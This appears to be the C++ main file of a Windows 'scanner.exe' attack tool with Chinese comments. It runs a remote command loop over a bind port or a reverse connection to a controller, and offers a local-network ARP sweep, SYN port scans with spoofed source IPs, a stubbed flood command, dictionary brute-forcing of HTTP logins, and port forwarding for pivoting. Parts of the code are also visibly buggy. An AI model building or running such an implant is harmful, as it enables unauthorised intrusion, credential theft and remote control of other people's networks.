
#pragma warning (disable:4786)

#include <math.h>
#include <stdio.h>
#include <string.h>

#include "local_network.h"
#include "network_crack.h"
#include "network_dictionary.h"
#include "network_encoder.h"
#include "network_route.h"
#include "resolver_express.h"
#include "resolver_dictionary.h"
#include "resolver_html.h"
#include "resolver_http.h"
#include "resolver_string.h"
#include "scan_arp.h"
#include "scan_icmp.h"
#include "scan_tcp.h"

#define LANUCH_COMMAND_BIND "-bind"
#define LANUCH_COMMAND_REVERSE_CONNENT "-recon"

#define DEFAULT_BIND_PORT 443

#define COMMAND_BUFFER_LENGTH 1024
#define RESULE_BUFFER_LENGTH  1024

enum execute_state {
    ERROR=0,
    OK,
    EXIT
};

static void output_data(const string output);
static void default_crack_dictionary(dictionary& output_dictionary);
static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip);
static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip);
static void default_tcp_scan_(string target_ip,unsigned int target_port);
static void default_tcp_scan (string target_ip);

static string control_ip;
static bool control_stat=false;
static unsigned int tcp_handle=-1;

/*

    scanner.exe 直接启动
    scanner.exe -bind %port% 绑定端口
    scanner.exe -recon %ip% [%port%] 反向连接,Default port is 80 ..

*/

static const string command_arplist("arp"),
                    //  扫描当前网段存活的主机,并且自动搜集数据
                    //  using:arp
                    command_network_information("local"),
                    //  获取当前主机的网络信息
                    //  using:local
                    command_ping("ping"),
                    //  测试主机是否连通
                    //  using:ping %ip%
                    command_scan_port("scan"),
                    //  TCP SYN 扫描主机
                    //  using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]
                    command_flood("flood"),
                    //  洪水攻击主机
                    //  using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]
                    command_crack("crack"),
                    //  在线破解
                    //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]
                    command_tracert("tracert"),
                    //  路由跟踪
                    //  using:tracert %ip%
                    command_getpage("getpage"),
                    //  抓取页面
                    //  using:getpage %ip% [-PORT:%port%] [-PATH:%path%]
                    command_route("route"),
                    //  启动端口转发功能
                    //  using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]
                    command_help("help"),
                    //  显示帮助
                    command_quit("quit");

static execute_state execute_command(const string command) {
    if (!command.empty()) {
        split_block_result split(split_block(command," "));
        unsigned int result_length=split.size();

        if (result_length) {
            string output_inforation;
            if (command_arplist==split[0]) {
                output_data("arp discover :\r\n");
                if (255>=network_session_size) {
                    split_result split(split_string(network_session,"."));
                    string network_session_(split.first);
                    left_move_string(split.second,1);
                    split=split_string(split.second,".");
                    network_session_+=".";
                    network_session_+=split.first;
                    left_move_string(split.second,1);
                    split=split_string(split.second,".");
                    network_session_+=".";
                    network_session_+=split.first;
                    network_session_+=".";

                    for (unsigned char machine_index=1;machine_index<255;++machine_index) {
                        string machine_index_(network_session_);
                        unsigned char target_mac[ETH_ADDRESS_LENGTH]={0};
                        char mac[0x20]={0};
                        machine_index_+=number_to_string(machine_index);
                        if (scan_arp(machine_index_.c_str(),(char*)target_mac)) {
                            sprintf(mac,"%X-%X-%X-%X-%X-%X",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
                            output_inforation="live:";
                            output_inforation+=machine_index_.c_str();
                            output_inforation+=" mac:";
                            output_inforation+=mac;
                        } else {
                            output_inforation="dead:";
                            output_inforation+=machine_index_.c_str();
                        }
                        output_data(output_inforation);
                    }
                    return OK;
                }  //  WARNING! 没有补全

                return ERROR;
            } else if (command_network_information==split[0]) {
                char mac[0x20]={0};
                output_inforation="local network information :\r\n";
                output_inforation+="local_ip:";
                output_inforation+=local_ip;
                output_inforation+="\r\nlocal_mac:";
                sprintf(mac,"%X-%X-%X-%X-%X-%X",local_mac[0],local_mac[1],local_mac[2],local_mac[3],local_mac[4],local_mac[5]);
                output_inforation+=mac;
                output_inforation+="\r\nnetwork_mask:";
                output_inforation+=network_mask;
                output_inforation+="\r\ngateway_ip:";
                output_inforation+=gateway_ip;
                output_inforation+="\r\ngateway_mac:";
                sprintf(mac,"%X-%X-%X-%X-%X-%X",gateway_mac[0],gateway_mac[1],gateway_mac[2],gateway_mac[3],gateway_mac[4],gateway_mac[5]);
                output_inforation+=mac;
                output_inforation+="\r\ndhcp_server:";
                output_inforation+=dhcp_server;
                output_inforation+="\r\n";
                output_data(output_inforation);
                return OK;
            } else if (command_ping==split[0]) {
                if (2!=result_length) return ERROR;

                reply ping_reply;

                output_inforation="ping - target:";
                output_inforation+=split[1];
                output_inforation+="\r\n";

                if (scan_icmp(split[1].c_str(),&ping_reply)) {
                    output_inforation+="target live \r\n";
                    output_inforation+="ping count:";
                    output_inforation+=number_to_string(ping_reply.count);
                    output_inforation+="  ping lost:";
                    output_inforation+=number_to_string(ping_reply.lost);
                    output_inforation+="  ping average delay:";
                    output_inforation+=number_to_string(ping_reply.delay);
                    output_inforation+="\r\n";
                } else
                    output_inforation+="target dead \r\n";
                output_data(output_inforation);
                return OK;
            } else if (command_scan_port==split[0]) {
                string flag_port("-P"),flag_fake("-F");

                if (2==result_length) {
                    output_inforation="scan default port:\r\n";
                    default_tcp_scan(split[1]);

                    return OK;
                } else if (3==result_length) {
                    string ip(split[1]);
                    split_result resolve_flag(split_string(split[2],":"));
                    string flag(resolve_flag.first),arg_list_string(separate_string(split[2],"[","]"));
                    split_block_result arg_list_(split_block(arg_list_string,","));

                    if (!flag.empty() && !arg_list_string.empty()) {
                        if (flag_port==flag) {
                            output_data("scan custom port:\r\n");
                            for (split_block_result::const_iterator iterator=arg_list_.begin();
                                                                    iterator!=arg_list_.end();
                                                                    ++iterator) {
                                unsigned int port=string_to_number(iterator->c_str());
                                default_tcp_scan_(ip,port);
                            }
                            return OK;
                        } else if (flag_fake==flag) {
                            output_data("scan port for fake ip:\r\n");
                            default_tcp_scan_fake_ip(ip,arg_list_);

                            return OK;
                        }
                    }
                } else if (4==result_length) {
                    string ip(split[1]);
                    split_result resolve_flag_1(split_string(split[2],":"));
                    string flag_1(resolve_flag_1.first),arg_list_string_1(separate_string(split[2],"[","]"));
                    split_block_result arg_list_1(split_block(arg_list_string_1,","));
                    split_result resolve_flag_2(split_string(split[3],":"));
                    string flag_2(resolve_flag_2.first),arg_list_string_2(separate_string(split[3],"[","]"));
                    split_block_result arg_list_2(split_block(arg_list_string_2,","));

                    if (!flag_1.empty() && !arg_list_string_1.empty() && !flag_2.empty() && !arg_list_string_2.empty()) {
                        split_block_result fake_ip_list,port_list;
                        output_data("scan custom port for fake ip:\r\n");
                        if (flag_port==flag_1) {
                            fake_ip_list=arg_list_2;
                            port_list=arg_list_1;
                        } else if (flag_port==flag_2) {
                            fake_ip_list=arg_list_1;
                            port_list=arg_list_2;
                        } else
                            return ERROR;

                        for (split_block_result::const_iterator iterator=port_list.begin();
                                                                iterator!=port_list.end();
                                                                ++iterator) {
                            unsigned int port=string_to_number(iterator->c_str());
                            default_tcp_scan_fake_ip_(ip,port,fake_ip_list);
                        }
                        return OK;
                    }
                }
                return ERROR;
            } else if (command_flood==split[0]) {
            } else if (command_crack==split[0]) {
                //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]

                //  WARNING! 因为%express 没有更好的方式接收用户的表达式输入(比如输入Enter 的时候就会递交
                //  命令,HTTP 包头里面包含空格),所以这个地方先搁置一下..

                if (5<=result_length && result_length<=7) {
                    string ip(split[1]);
                    string port_(split[2]);
                    string express(split[3]);
                    string success_term(split[3]);
                    dictionary crack_dictionary;
                    unsigned short port=string_to_number(port_);

                    if (7==result_length) {
                        string user_dictionary_path(split[4]),
                               password_dictionary_path(split[5]);
                        resolve_dictionary_open(user_dictionary_path,password_dictionary_path);
                    } else
                        return ERROR;
                    if (5==result_length) {
                        default_crack_dictionary(crack_dictionary);
                    }

                    if (-1!=port && check_ip(ip.c_str())) {
                        crack_index result=network_crack_http(ip,port,crack_dictionary,express,success_term);
                        output_inforation="network crack - target:";
                        output_inforation+=ip;
                        output_inforation+=":";
                        output_inforation+=port_;
                        output_inforation+="\r\n";
                        if (result.first.empty() && result.second.empty()) {
                            output_inforation+="crack error! no success username and password!\r\n";
                        } else {
                            output_inforation+="username:";
                            output_inforation+=result.first;
                            output_inforation+="password:";
                            output_inforation+=result.second;
                            output_inforation+="\r\n";
                        }
                        output_data(output_inforation);
                        return OK;
                    }
                }
                return ERROR;
            } else if (command_tracert==split[0]) {
                tracert_list result=scan_icmp_tracert(split[1].c_str());
                unsigned int tracert_index=0;
                output_inforation="tracert route - target:";
                output_inforation+=split[1];
                output_inforation+="\r\n";

                for (tracert_list::const_iterator iterator=result.begin();
                                                  iterator!=result.end();
                                                  ++iterator,++tracert_index) {
                    string number=number_to_string(tracert_index);
                    output_inforation+=number;
                    output_inforation+=":";
                    output_inforation+=*iterator;
                    output_inforation+="\r\n";
                }
                output_data(output_inforation);
                return OK;
            } else if (command_getpage==split[0]) {
                scan_tcp_port_information port_information={0};
                string target_ip(split[1]);
                string port_("80");
                string path("/");
                string flag_port(upper_string("-PORT")),flag_path(upper_string("-PATH"));

                if (3==result_length) {
                    split_result resolve_arg_list(split_string(split[2],":"));
                    if (!resolve_arg_list.second.empty()) {
                        left_move_string(resolve_arg_list.second,1);
                        if (flag_port==upper_string(resolve_arg_list.first))
                            port_=resolve_arg_list.second;
                        else if (flag_path==upper_string(resolve_arg_list.first))
                            path=resolve_arg_list.second;
                    }
                } else if (4==result_length) {
                    split_result resolve_arg_list(split_string(split[2],":"));

                    if (!resolve_arg_list.second.empty()) {
                        left_move_string(resolve_arg_list.second,1);
                        if (flag_port==upper_string(resolve_arg_list.first))
                            port_=resolve_arg_list.second;
                        else if (flag_path==upper_string(resolve_arg_list.first))
                            path=resolve_arg_list.second;
                    }

                    resolve_arg_list=split_string(split[3],":");

                    if (!resolve_arg_list.second.empty()) {
                        left_move_string(resolve_arg_list.second,1);
                        if (flag_port==upper_string(resolve_arg_list.first))
                            port_=resolve_arg_list.second;
                        else if (flag_path==upper_string(resolve_arg_list.first))
                            path=resolve_arg_list.second;
                    }
                }

                unsigned int port=string_to_number(port_);
                
                if (scan_tcp_get_data(target_ip.c_str(),port,path.c_str(),&port_information)) {
                    output_inforation="getpage port(";
                    output_inforation+=number_to_string(port_information.port);
                    output_inforation+=") page-length(";
                    output_inforation+=number_to_string(port_information.data_length);
                    output_inforation+=") pagedata:\r\n";
                    output_inforation+=port_information.data;
                    output_inforation+="\r\n";
                    output_data(output_inforation);
                    return OK;
                }
                return ERROR;
            } else if (command_route==split[0]) {
                if (3==result_length) {
                    split_result resolve_arg(split_string(split[1],":"));
                    string flag_1(resolve_arg.first),arg_list_1(separate_string(resolve_arg.second,"[","]"));

                    resolve_arg=split_string(split[2],":");
                    string flag_2(resolve_arg.first),arg_list_2(separate_string(resolve_arg.second,"[","]"));
                    string flag_remote("-R"),flag_local("-L");
                    string remote_ip,remote_port_,local_ip,local_port_;

                    if (flag_remote==flag_1 && flag_local==flag_2) {
                        resolve_arg=split_string(arg_list_1,",");
                        remote_ip=resolve_arg.first;
                        remote_port_=resolve_arg.second;
                        left_move_string(remote_port_,1);

                        resolve_arg=split_string(arg_list_2,",");
                        if (resolve_arg.second.empty()) {
                            local_ip=control_ip;
                            local_port_=resolve_arg.first;
                        } else {
                            local_ip=resolve_arg.first;
                            local_port_=resolve_arg.second;
                            left_move_string(local_port_,1);
                        }
                    } else if (flag_local==flag_1 && flag_remote==flag_2) {
                        resolve_arg=split_string(arg_list_2,",");
                        remote_ip=resolve_arg.first;
                        remote_port_=resolve_arg.second;
                        left_move_string(remote_port_,1);

                        resolve_arg=split_string(arg_list_1,",");
                        if (resolve_arg.second.empty()) {
                            local_ip=control_ip;
                            local_port_=resolve_arg.first;
                        } else {
                            local_ip=resolve_arg.first;
                            local_port_=resolve_arg.second;
                            left_move_string(local_port_,1);
                        }
                    } else
                        return ERROR;

                    unsigned int remote_port=string_to_number(remote_port_),local_port=string_to_number(local_port_);
                    
                    if (network_route(remote_ip.c_str(),remote_port,local_ip.c_str(),local_port)) {
                        output_inforation="route turn on => (remote ";
                        output_inforation+=remote_ip.c_str();
                        output_inforation+=":";
                        output_inforation+=number_to_string(remote_port);
                        output_inforation+=",local ";
                        output_inforation+=local_ip.c_str();
                        output_inforation+=":";
                        output_inforation+=number_to_string(local_port);
                        output_inforation+=")\r\n";
                        output_data(output_inforation);
                        return OK;
                    }
                }

                return ERROR;
            } else if (command_help==split[0]) {
                output_inforation="help:\r\n";
                output_inforation+="扫描当前网段存活的主机,并且自动搜集数据\r\n";
                output_inforation+="using:arp\r\n";
                output_inforation+="获取当前主机的网络信息\r\n";
                output_inforation+="using:local\r\n";
                output_inforation+="测试主机是否连通\r\n";
                output_inforation+="TCP SYN 扫描主机\r\n";
                output_inforation+="using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]\r\n";
                output_inforation+="洪水攻击主机\r\n";
                output_inforation+="using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]\r\n";
                output_inforation+="在线破解\r\n";
                output_inforation+="using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]\r\n";
                output_inforation+="路由跟踪\r\n";
                output_inforation+="using:tracert %ip%\r\n";
                output_inforation+="抓取页面\r\n";
                output_inforation+="using:getpage %ip% [-PORT:%port%] [-PATH:%path%]\r\n";
                output_inforation+="启动端口转发功能\r\n";
                output_inforation+="using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]\r\n";
                output_inforation+="退出\r\n";
                output_inforation+="using:quit\r\n";
                output_data(output_inforation);
                return OK;
            } else if (command_quit==split[0]) {
                return EXIT;
            }
        }
    }
    return ERROR;
}
void main(int arg_count,char** arg_list) {
    local_network_init();

    if (1==arg_count) {
        //  直接启动
        char command_buffer[COMMAND_BUFFER_LENGTH]={0};
        string output_infomation;

        while (true) {
            gets(command_buffer);

            switch (execute_command(command_buffer)) {
                case EXIT:
                    output_data("user exit!\n");
                    goto EXIT;
                case ERROR:
                    output_data("ERROR!\r\n");
            }
            memset(command_buffer,0,COMMAND_BUFFER_LENGTH);
        }
    } else {
        control_stat=true;
        if (!strcmp(arg_list[1],LANUCH_COMMAND_BIND)) {
            //scanner.exe -bind | scanner.exe -bind %port%
            unsigned int client_handle=-1;
            if (2==arg_count) {
                client_handle=scan_tcp_bind(DEFAULT_BIND_PORT);
                if (-1==tcp_handle) {
                    output_data("create bind error!\n");
                    goto EXIT;
                }
                tcp_handle=scan_tcp_accept(client_handle);
                if (-1==client_handle) {
                    output_data("accept connect error!\n");
                    scan_tcp_disconnect(client_handle);
                    goto EXIT;
                }
            } else if (3==arg_count) {
                client_handle=scan_tcp_bind(string_to_number(arg_list[2]));
                if (-1==tcp_handle) {
                    output_data("create bind error!\n");
                    goto EXIT;
                }
                tcp_handle=scan_tcp_accept(client_handle);
                if (-1==client_handle) {
                    output_data("accept connect error!\n");
                    scan_tcp_disconnect(client_handle);
                    goto EXIT;
                }
            } else {
                output_data("use command \"-bind\":-bind or -bind %port%\n");
                    goto EXIT;
            }
            char command_buffer[COMMAND_BUFFER_LENGTH]={0};
            string output_infomation;

            while (true) {
                unsigned int recv_length=scan_tcp_recv(tcp_handle,command_buffer,COMMAND_BUFFER_LENGTH);

                if (-1==recv_length) {
                    scan_tcp_disconnect(tcp_handle);
                    goto EXIT;
                }
                network_decode(command_buffer,recv_length);

                switch (execute_command(command_buffer)) {
                    case EXIT:
                        output_data("user exit!\n");
                        goto EXIT;
                    case ERROR:
                        output_data("ERROR!\r\n");
                }
            }
        }
        if (!strcmp(arg_list[1],LANUCH_COMMAND_REVERSE_CONNENT)) {
            string ip(arg_list[2]),port_("80");

            if (4==arg_count || 3==arg_count) {
                //scanner.exe -recon %ip% [%port%]
                if (4==arg_count)
                    port_=arg_list[3];
                unsigned short port=string_to_number(port_.c_str());
                tcp_handle=scan_tcp_connect(ip.c_str(),port);

                if (-1!=tcp_handle) {
                    control_ip=ip;
                    char command_buffer[COMMAND_BUFFER_LENGTH]={0};
                    string output_infomation;

                    while (true) {
                        unsigned int recv_length=scan_tcp_recv(tcp_handle,command_buffer,COMMAND_BUFFER_LENGTH);

                        if (-1==recv_length) {
                            scan_tcp_disconnect(tcp_handle);
                            goto EXIT;
                        }
                        network_decode(command_buffer,recv_length);

                        switch (execute_command(command_buffer)) {
                            case EXIT:
                                output_data("user exit!\n");
                                goto EXIT;
                            case ERROR:
                                output_data("ERROR!\r\n");
                        }
                    }
                } else {
                    output_data("reverse tcp connect error!\n");
                    goto EXIT;
                }
            } else
                output_data("using:scanner.exe -recon %%ip%% [%%port%%]\n");
        }
    }
    output_data("ERR COMMAND!\n");

EXIT:
    local_network_clean();
}

static void output_data(const string output) {
    if (!control_stat) {
        printf("%s\n",output.c_str());
    } else {
        unsigned send_length=output.length();
        char send_buffer[RESULE_BUFFER_LENGTH]={0};
        memcpy(send_buffer,output.c_str(),send_length);
        send_length=network_encode(send_buffer,send_length);
        scan_tcp_send(tcp_handle,send_buffer,send_length);
        sleep(50);
    }
}

static void default_crack_dictionary(dictionary& output_dictionary) {
    unsigned int username_count=sizeof(username)/4;
    unsigned int password_count=sizeof(password)/4;

    for (unsigned int index=0;index<username_count;++index)
        resolve_dictionary_add_username(output_dictionary,username[index]);

    for (index=0;index<password_count;++index)
        resolve_dictionary_add_password(output_dictionary,password[index]);
}

static void default_tcp_scan_(string target_ip,unsigned int target_port) {
    string output_information;
    output_information+=number_to_string(target_port);
    output_information+=":";
    if (scan_tcp(target_ip.c_str(),target_port))
        output_information+="open";
    else
        output_information+="close";
    output_data(output_information);
}

static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip) {
    for (split_block_result::const_iterator iterator=fake_ip.begin();
                                            iterator!=fake_ip.end();
                                            ++iterator) {
        scan_tcp_fake_ip(target_ip.c_str(),target_port,iterator->c_str(),SCAN_TCP_PORT);
    }
    default_tcp_scan_(target_ip,target_port);
}

static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip) {
    // 80,8080,3128,8081,9080,1080,21,23,443,69,22,25,110,7001,9090,3389,1521,1158,2100,1433,135,139,445,1025
    default_tcp_scan_fake_ip_(target_ip,22,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,23,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,25,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,69,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,80,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,110,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,135,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,139,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,443,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,445,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,1025,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,1080,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,1158,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,1433,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,1521,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,2100,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,3128,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,3389,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,7001,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,8080,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,8081,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,9080,fake_ip);
    default_tcp_scan_fake_ip_(target_ip,9090,fake_ip);
}

static void default_tcp_scan(string target_ip) {
    split_block_result ip;
    ip.push_back(local_ip);
    default_tcp_scan_fake_ip(target_ip,ip);
}
